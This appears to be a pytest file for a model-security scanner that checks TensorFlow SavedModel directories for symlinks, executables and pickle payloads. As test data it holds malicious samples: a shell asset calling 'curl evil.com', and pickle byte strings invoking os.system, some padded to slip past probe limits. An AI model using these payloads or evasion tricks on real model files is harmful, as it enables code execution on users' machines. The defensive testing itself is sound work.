def test_savedmodel_reserved_root_dir_name_symlink_is_reported(
    tmp_path: Path,
    requires_symlinks: None,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    target_path = model_dir / "payload.dat"
    target_path.write_bytes(_build_protocol1_pickle_payload())
    sibling_path = model_dir / "variables"
    shutil.rmtree(sibling_path)
    sibling_path.symlink_to(target_path.name)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]

    assert matching_checks
    assert all("symlink supplemental file" in check.message.lower() for check in matching_checks)
    assert all(check.details.get("detected_content_type") == "unscannable_asset" for check in matching_checks)
    assert all(check.details.get("asset_kind") == "symlink" for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_root_sibling_directory_symlink_is_reported_without_traversal(
    tmp_path: Path,
    requires_symlinks: None,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    external_dir = tmp_path / "outside"
    external_dir.mkdir()
    (external_dir / "payload.dat").write_bytes(_build_protocol1_pickle_payload())
    sibling_path = model_dir / "supplemental"
    sibling_path.symlink_to(external_dir, target_is_directory=True)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Supplemental File Security Check" and check.location == str(sibling_path)
    ]

    assert matching_checks
    assert all("symlink supplemental file" in check.message.lower() for check in matching_checks)
    assert all(check.details.get("detected_content_type") == "unscannable_asset" for check in matching_checks)
    assert all(check.details.get("asset_kind") == "symlink" for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_large_unclassified_asset_marks_scan_inconclusive(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "large.dat"
    asset_path.write_bytes(b"A" * (tf_savedmodel_module._ASSET_PROBE_BYTES + 1))

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    probe_checks = [check for check in result.checks if check.name == "SavedModel Asset Probe Limit"]
    assert len(probe_checks) == 1
    assert probe_checks[0].details["analysis_incomplete"] is True


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_shell_script_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "evil.sh"
    asset_path.write_text("#!/bin/bash\ncurl evil.com\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [
        issue
        for issue in result.issues
        if issue.location == str(asset_path) and issue.message.startswith("Suspicious executable-like content")
    ]

    assert asset_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in asset_issues)
    assert all(
        issue.details.get("detected_content_type") and "script_shebang" in issue.details["detected_content_type"]
        for issue in asset_issues
    )
    assert all(issue.details.get("file_name") == "evil.sh" for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_python_pattern_in_non_py_file_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "helper.dat"
    asset_path.write_text("import os\n\ndef runner():\n    return os.getenv('HOME')\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Assets Security Check" and check.location == str(asset_path)
    ]

    assert matching_checks
    assert all(check.severity == IssueSeverity.WARNING for check in matching_checks)
    assert all(
        check.details.get("detected_content_type") and "python_source_pattern" in check.details["detected_content_type"]
        for check in matching_checks
    )
    assert all(isinstance(check.details.get("size"), int) and check.details["size"] > 0 for check in matching_checks)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_numeric_class_labels_do_not_trigger_python_source_detection(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "labels.txt"
    asset_path.write_text("class 1: dog\nclass 2: cat\n", encoding="utf-8")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    matching_checks = [
        check
        for check in result.checks
        if check.name == "SavedModel Assets Security Check" and check.location == str(asset_path)
    ]

    assert matching_checks == []


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_extra_pe_executable_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    extra_dir = model_dir / "assets.extra"
    extra_dir.mkdir(exist_ok=True)
    pe_path = extra_dir / "helper.dll"
    pe_path.write_bytes(_build_minimal_pe_bytes())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(pe_path)]
    assert asset_issues
    assert any("pe_executable" in issue.details.get("detected_content_type", "") for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_symlink_is_reported_without_following_target(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    external_script = tmp_path / "outside.sh"
    external_script.write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
    asset_path = model_dir / "assets" / "outside-link.sh"
    try:
        asset_path.symlink_to(external_script)
    except (NotImplementedError, OSError, PermissionError) as exc:
        pytest.skip(f"Symlinks unavailable in test environment: {exc}")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in asset_issues)
    assert all("symlink" in issue.message.lower() for issue in asset_issues)
    assert all(issue.details.get("detected_content_type") == "unscannable_asset" for issue in asset_issues)
    assert all(issue.details.get("asset_kind") == "symlink" for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_symlink_is_not_followed_by_blacklist_scan(
    tmp_path: Path,
    requires_symlinks: None,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    external_text = tmp_path / "outside.txt"
    external_text.write_text("contains suspicious_function\n", encoding="utf-8")
    asset_path = model_dir / "assets" / "outside-link.txt"
    asset_path.symlink_to(external_text)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner(
        config={"blacklist_patterns": ["suspicious_function"]}
    ).scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any(issue.details.get("asset_kind") == "symlink" for issue in asset_issues)
    assert all("blacklisted pattern" not in issue.message.lower() for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_directory_stat_error_redacts_exception(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    raw_secret = "ATTACKER_CONTROLLED_ASSET_STAT_FAILURE"
    model_dir = Path(create_tf_savedmodel(tmp_path))
    assets_dir = model_dir / "assets"
    assets_dir.mkdir(exist_ok=True)
    real_lstat = Path.lstat

    def fail_assets_lstat(path: Path) -> Any:
        if path == assets_dir:
            raise OSError(raw_secret)
        return real_lstat(path)

    monkeypatch.setattr(Path, "lstat", fail_assets_lstat)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    stat_issues = [issue for issue in result.issues if issue.details.get("asset_kind") == "stat_error"]

    assert stat_issues
    assert stat_issues[0].details["exception"] == "<redacted>"
    assert "<redacted>" in stat_issues[0].message
    assert raw_secret not in result.to_json()


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_directory_symlink_is_not_traversed(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    external_dir = tmp_path / "outside-assets"
    external_dir.mkdir()
    (external_dir / "outside.sh").write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
    extra_dir = model_dir / "assets.extra"
    try:
        extra_dir.symlink_to(external_dir, target_is_directory=True)
    except (NotImplementedError, OSError, PermissionError) as exc:
        pytest.skip(f"Symlinks unavailable in test environment: {exc}")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]
    traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]

    assert symlink_dir_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in symlink_dir_issues)
    assert all("symlinked asset directory" in issue.message.lower() for issue in symlink_dir_issues)
    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in symlink_dir_issues)
    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in symlink_dir_issues)
    assert traversed_issues == []


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_dangling_asset_directory_symlink_is_reported(
    tmp_path: Path,
    requires_symlinks: None,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    extra_dir = model_dir / "assets.extra"
    extra_dir.symlink_to(tmp_path / "missing-assets", target_is_directory=True)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    symlink_dir_issues = [issue for issue in result.issues if issue.location == str(extra_dir)]

    assert symlink_dir_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in symlink_dir_issues)
    assert all("symlinked asset directory" in issue.message.lower() for issue in symlink_dir_issues)
    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in symlink_dir_issues)
    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in symlink_dir_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_nested_asset_directory_symlink_is_reported_without_traversal(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    external_dir = tmp_path / "outside-nested-assets"
    external_dir.mkdir()
    (external_dir / "outside.sh").write_text("#!/bin/bash\necho escape\n", encoding="utf-8")
    nested_dir = model_dir / "assets" / "nested"
    try:
        nested_dir.symlink_to(external_dir, target_is_directory=True)
    except (NotImplementedError, OSError, PermissionError) as exc:
        pytest.skip(f"Symlinks unavailable in test environment: {exc}")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    nested_dir_issues = [issue for issue in result.issues if issue.location == str(nested_dir)]
    traversed_issues = [issue for issue in result.issues if issue.location and issue.location.endswith("outside.sh")]

    assert nested_dir_issues
    assert all(issue.severity == IssueSeverity.WARNING for issue in nested_dir_issues)
    assert all("symlinked nested asset directory" in issue.message.lower() for issue in nested_dir_issues)
    assert all(issue.details.get("detected_content_type") == "unscannable_asset_dir" for issue in nested_dir_issues)
    assert all(issue.details.get("asset_kind") == "symlink_directory" for issue in nested_dir_issues)
    assert traversed_issues == []


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "payload.dat"
    asset_path.write_bytes(_build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_protocol1_pickle_with_binint1_pop_prefix_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "prefixed-payload.dat"
    asset_path.write_bytes(b"K\x000" + _build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_trivial_prefix_pickle_with_trailing_junk_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "trailing-junk-payload.dat"
    asset_path.write_bytes(b"(l0" + _build_protocol1_pickle_payload() + b"JUNK")

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_savedmodel_directory_detects_trailing_junk_pickle_asset(tmp_path: Path) -> None:
    """Full directory scans should route junk-suffixed pickle assets into pickle analysis."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "payload.dat"
    asset_path.write_bytes(b'(l0cos\nsystem\n(S"echo pwned"\ntR.JUNK')

    result = scan_model_directory_or_file(str(model_dir))

    assert determine_exit_code(result) == 1
    assert any(
        issue.rule_code == "S201"
        and issue.location is not None
        and asset_path.name in issue.location
        and "os.system" in issue.message
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_savedmodel_directory_detects_opcode_budget_padded_pickle_asset(tmp_path: Path) -> None:
    """Balanced trivial opcode padding should not suppress pickle routing in full scans."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "budget-padded-payload.dat"
    asset_path.write_bytes(b"I0\n0" * 5000 + b'cos\nsystem\n(S"echo pwned"\ntR.')

    result = scan_model_directory_or_file(str(model_dir))

    assert determine_exit_code(result) == 1
    assert any(
        issue.rule_code == "S201"
        and issue.location is not None
        and asset_path.name in issue.location
        and "os.system" in issue.message
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_savedmodel_directory_detects_probe_boundary_padded_pickle_asset(tmp_path: Path) -> None:
    """A valid pickle prefix at the probe boundary should still route the asset into pickle analysis."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "probe-boundary-payload.dat"
    asset_path.write_bytes(
        b"(t0" + b"I0\n0" * (PROTO0_1_MAX_PROBE_BYTES // 4 + 1) + b'cos\nsystem\n(S"echo pwned"\ntR.',
    )

    result = scan_model_directory_or_file(str(model_dir))

    assert determine_exit_code(result) == 1
    assert any(
        issue.rule_code == "S201"
        and issue.location is not None
        and asset_path.name in issue.location
        and "os.system" in issue.message
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_owner_detects_extended_probe_opcode_budget_pickle(tmp_path: Path) -> None:
    """The extended byte probe must not retain the smaller opcode ceiling."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "extended-opcode-budget.dat"
    asset_path.write_bytes(
        b"I0\n0" * 16_384 + b"N0" * 16_384 + b'cos\nsystem\n(S"echo pwned"\ntR.',
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert any(
        issue.location == str(asset_path) and "pickle_payload" in issue.details.get("detected_content_type", "")
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_owner_detects_exact_opcode_boundary_pickle(tmp_path: Path) -> None:
    """Exactly one opcode budget of balanced padding must trigger the extended probe."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "exact-opcode-boundary.dat"
    asset_path.write_bytes(b"(0" * 32_768 + b'cos\nsystem\n(S"echo pwned"\ntR.')

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert any(
        issue.location == str(asset_path) and "pickle_payload" in issue.details.get("detected_content_type", "")
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_savedmodel_directory_trivial_probe_boundary_padding_stays_clean(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Large trivial opcode prefixes without STOP should not be routed as pickle payloads."""
    monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "probe-boundary-notes.txt"
    asset_path.write_bytes(b"I0\n0" * (PROTO0_1_MAX_PROBE_BYTES // 4 + 1))

    result = scan_model_directory_or_file(str(model_dir))

    assert determine_exit_code(result) == 0
    assert all(issue.location is None or asset_path.name not in issue.location for issue in result.issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_growth_during_extended_probe_is_inconclusive(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A concurrent asset mutation must not be accepted from a stale bounded read."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "growing-payload.dat"
    asset_path.write_bytes(b"I0\n0" * (PROTO0_1_MAX_PROBE_BYTES // 4 + 1))
    original_prefix_check = tf_savedmodel_module._is_trivial_proto0_padding_prefix
    mutated = False

    def mutate_after_initial_read(sample: bytes) -> bool:
        nonlocal mutated
        if not mutated:
            mutated = True
            with asset_path.open("ab") as file_obj:
                file_obj.write(
                    b"0" * tf_savedmodel_module._ASSET_TRIVIAL_PADDING_COMPLETE_BYTES
                    + b'cos\nsystem\n(S"echo pwned"\ntR.',
                )
        return original_prefix_check(sample)

    monkeypatch.setattr(
        tf_savedmodel_module,
        "_is_trivial_proto0_padding_prefix",
        mutate_after_initial_read,
    )

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert mutated is True
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "savedmodel_asset_source_changed" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "savedmodel_asset_source_changed"
    stability_checks = [check for check in result.checks if check.name == "SavedModel Asset Source Stability"]
    assert len(stability_checks) == 1
    assert stability_checks[0].location == str(asset_path)
    assert stability_checks[0].details["analysis_incomplete"] is True
    assert stability_checks[0].details["final_size"] > stability_checks[0].details["initial_size"]


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_asset_open_failure_is_operationally_incomplete(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "unreadable.dat"
    asset_path.write_bytes(b"benign asset")
    real_open = tf_savedmodel_module.os.open

    def fail_asset_open(candidate: Any, flags: int, *args: Any, **kwargs: Any) -> int:
        if Path(candidate) == asset_path:
            raise PermissionError("simulated asset open failure")
        return real_open(candidate, flags, *args, **kwargs)

    monkeypatch.setattr(tf_savedmodel_module.os, "open", fail_asset_open)

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))

    assert result.success is False
    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
    assert "savedmodel_asset_read_failed" in result.metadata["scan_outcome_reasons"]
    assert result.metadata["operational_error"] is True
    assert any(
        check.location == str(asset_path) and check.details.get("scan_outcome_reason") == "savedmodel_asset_read_failed"
        for check in result.checks
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_scan_savedmodel_directory_benign_list_prefix_asset_stays_clean(tmp_path: Path) -> None:
    """Plain-text near-matches should not become pickle findings in full directory scans."""
    model_dir = Path(create_tf_savedmodel(tmp_path))
    asset_path = model_dir / "assets" / "notes.txt"
    asset_path.write_bytes(b"(l0.not a pickle stream")

    result = scan_model_directory_or_file(str(model_dir))

    assert determine_exit_code(result) == 0
    assert all(issue.location is None or asset_path.name not in issue.location for issue in result.issues)


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_extra_comment_prefixed_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    extra_dir = model_dir / "assets.extra"
    extra_dir.mkdir(exist_ok=True)
    asset_path = extra_dir / "bypass.dat"
    asset_path.write_bytes(b"#" + _build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)
    assert all(
        issue.details.get("detected_content_type", "").split(", ").count("pickle_payload") == 1
        for issue in asset_issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_savedmodel_assets_extra_long_comment_prefixed_protocol1_pickle_is_flagged(tmp_path: Path) -> None:
    model_dir = Path(create_tf_savedmodel(tmp_path))
    extra_dir = model_dir / "assets.extra"
    extra_dir.mkdir(exist_ok=True)
    asset_path = extra_dir / "deep_bypass.dat"
    asset_path.write_bytes((b"# asset padding for documentation only\n" * 300) + _build_protocol1_pickle_payload())

    result = tf_savedmodel_module.TensorFlowSavedModelScanner().scan(str(model_dir))
    asset_issues = [issue for issue in result.issues if issue.location == str(asset_path)]

    assert asset_issues
    assert any("pickle_payload" in issue.details.get("detected_content_type", "") for issue in asset_issues)


def test_tf_savedmodel_scanner_not_a_directory(tmp_path):
    """Test scanning a file instead of a directory."""
    # Create a file
    test_file = tmp_path / "model.pb"
    test_file.write_bytes(b"dummy content")

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(str(test_file))

    # Should have an issue about invalid protobuf format or TensorFlow not installed
    # Note: Missing dependencies are WARNING (not security issue), errors in parsing are CRITICAL
    assert len(result.issues) > 0
    assert any(
        "error" in issue.message.lower()
        or "parsing" in issue.message.lower()
        or "tensorflow not installed" in issue.message.lower()
        for issue in result.issues
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks: None) -> None:
    """Scanner should report unreadable files instead of silently skipping."""
    model_dir = create_tf_savedmodel(tmp_path)

    missing = model_dir / "missing.txt"
    missing.write_text("secret")
    # Replace file with dangling symlink to trigger read error
    missing.unlink()
    missing.symlink_to("/nonexistent/path")

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner(config={"blacklist_patterns": ["secret"]})
    result = scanner.scan(str(model_dir))

    assert any("error reading file" in issue.message.lower() for issue in result.issues)


def _create_test_savedmodel_with_op(tmp_path: Path, op_name: str, model_name: str | None = None) -> str:
    """Helper function to create a test SavedModel with a specific TensorFlow operation."""
    return _create_test_savedmodel_with_ops(tmp_path, [op_name], model_name)


def _create_test_savedmodel_with_collection(
    tmp_path: Path,
    *,
    key: str,
    value: bytes,
    model_name: str,
) -> str:
    """Create a SavedModel with one bytes collection entry."""
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    model_dir = tmp_path / model_name
    model_dir.mkdir()

    saved_model = SavedModel()
    meta_graph = saved_model.meta_graphs.add()
    meta_graph.meta_info_def.tags.append("serve")
    meta_graph.collection_def[key].bytes_list.value.append(value)

    (model_dir / "saved_model.pb").write_bytes(saved_model.SerializeToString())
    (model_dir / "variables").mkdir()

    return str(model_dir)


def _create_test_savedmodel_with_scoped_nodes(
    tmp_path: Path,
    *,
    graph_nodes: list[_NodeSpec] | None = None,
    function_nodes: dict[str, list[_NodeSpec]] | None = None,
    collection_values: dict[str, list[bytes]] | None = None,
    model_name: str | None = None,
) -> str:
    """Create a SavedModel with top-level and function-definition graph nodes."""
    import importlib

    importlib.import_module("modelaudit.protos")
    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel

    if model_name is None:
        model_name = "test_model_scoped_nodes"

    model_dir = tmp_path / model_name
    model_dir.mkdir()

    # Create SavedModel with the specified operations
    saved_model = SavedModel()
    meta_graph = saved_model.meta_graphs.add()
    meta_graph.meta_info_def.tags.append("serve")

    graph_def = meta_graph.graph_def

    def add_node(node_collection: _NodeCollection, spec: _NodeSpec, default_name: str) -> None:
        node = node_collection.add()
        node.name = spec.get("name", default_name)
        node.op = spec["op"]
        node.input.extend(spec.get("inputs", []))

        for attr_name, attr_value in spec.get("string_attrs", {}).items():
            node.attr[attr_name].s = attr_value.encode("utf-8")
        for attr_name, attr_values in spec.get("string_list_attrs", {}).items():
            node.attr[attr_name].list.s.extend(value.encode("utf-8") for value in attr_values)

        function_ref = spec.get("function_ref")
        if function_ref is not None:
            node.attr["f"].func.name = function_ref

    for index, spec in enumerate(graph_nodes or []):
        add_node(graph_def.node, spec, f"graph_node_{index}_{str(spec['op']).lower()}")

    for function_name, node_specs in (function_nodes or {}).items():
        function_def = graph_def.library.function.add()
        function_def.signature.name = function_name
        for index, spec in enumerate(node_specs):
            add_node(function_def.node_def, spec, f"function_node_{index}_{str(spec['op']).lower()}")

    for collection_name, values in (collection_values or {}).items():
        meta_graph.collection_def[collection_name].bytes_list.value.extend(values)

    # Save the model
    saved_model_path = model_dir / "saved_model.pb"
    saved_model_path.write_bytes(saved_model.SerializeToString())

    # Create variables directory (required for valid SavedModel)
    variables_dir = model_dir / "variables"
    variables_dir.mkdir()

    return str(model_dir)


def _create_test_savedmodel_with_ops(
    tmp_path: Path,
    op_names: list[str],
    model_name: str | None = None,
) -> str:
    """Helper function to create a test SavedModel with multiple TensorFlow operations."""
    if model_name is None:
        model_name = f"test_model_{'_'.join(op.lower() for op in op_names[:2])}"

    graph_nodes: list[_NodeSpec] = [{"op": op_name} for op_name in op_names]
    return _create_test_savedmodel_with_scoped_nodes(
        tmp_path,
        graph_nodes=graph_nodes,
        model_name=model_name,
    )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_scanner_explanations_for_all_suspicious_ops(tmp_path: Path) -> None:
    """Test that all suspicious TensorFlow operations generate explanations."""
    from modelaudit.config.explanations import get_tf_op_explanation
    from modelaudit.detectors.suspicious_symbols import SUSPICIOUS_OPS

    # Test each suspicious operation individually
    for op_name in SUSPICIOUS_OPS:
        # Create a SavedModel with the specific suspicious operation
        model_path = _create_test_savedmodel_with_op(tmp_path, op_name)

        # Scan the model
        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
        result = scanner.scan(model_path)

        # Should detect the suspicious operation
        suspicious_issues = [
            issue
            for issue in result.issues
            if issue.message and op_name in issue.message and issue.severity == IssueSeverity.CRITICAL
        ]

        assert len(suspicious_issues) > 0, f"Failed to detect suspicious TensorFlow operation: {op_name}"

        # Check that explanation is provided
        for issue in suspicious_issues:
            assert issue.why is not None, f"Missing explanation for suspicious TF operation: {op_name}"

            # Verify the explanation matches what we expect
            expected_explanation = get_tf_op_explanation(op_name)
            assert issue.why == expected_explanation, (
                f"Explanation mismatch for {op_name}. Expected: {expected_explanation}, Got: {issue.why}"
            )

            # Verify explanation quality
            assert len(issue.why) > 20, f"Explanation too short for {op_name}: {issue.why}"
            assert any(
                keyword in issue.why.lower()
                for keyword in ["attack", "malicious", "abuse", "exploit", "dangerous", "risk", "exfiltration"]
            ), f"Explanation for {op_name} should mention security risks: {issue.why}"


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_scanner_explanation_categories(tmp_path: Path) -> None:
    """Test that TensorFlow scanner provides appropriate explanations by operation category."""
    # Test critical risk operations (code execution)
    critical_ops = ["PyFunc", "PyCall", "ExecuteOp", "ShellExecute", "LoadLibrary"]
    for op_name in critical_ops:
        model_path = _create_test_savedmodel_with_op(tmp_path, op_name, f"critical_test_{op_name.lower()}")

        scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
        result = scanner.scan(model_path)

        # Find issues related to this operation
        op_issues = [issue for issue in result.issues if issue.message and op_name in issue.message]
        assert len(op_issues) > 0, f"No issues found for critical operation {op_name}"

        for issue in op_issues:
            if issue.why:  # Check explanations when provided
                # Critical operations should mention code execution or system risks
                critical_keywords = ["execute", "code", "system", "shell", "commands", "arbitrary"]
                assert any(keyword in issue.why.lower() for keyword in critical_keywords), (
                    f"Critical operation {op_name} explanation should mention execution risks: {issue.why}"
                )


@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
def test_tf_scanner_no_explanation_for_safe_ops(tmp_path: Path) -> None:
    """Test that safe TensorFlow operations don't generate unnecessary explanations."""
    # Create a model with only safe operations
    safe_ops = ["MatMul", "Add", "Relu", "Conv2D", "MaxPool"]
    model_path = _create_test_savedmodel_with_ops(tmp_path, safe_ops, "safe_model")

    scanner = tf_savedmodel_module.TensorFlowSavedModelScanner()
    result = scanner.scan(model_path)

    # Should not have any critical issues about suspicious operations
    suspicious_issues = [
        issue
        for issue in result.issues
        if issue.severity == IssueSeverity.CRITICAL and "suspicious" in issue.message.lower()
    ]
    assert len(suspicious_issues) == 0, "Safe operations should not trigger suspicious operation warnings"

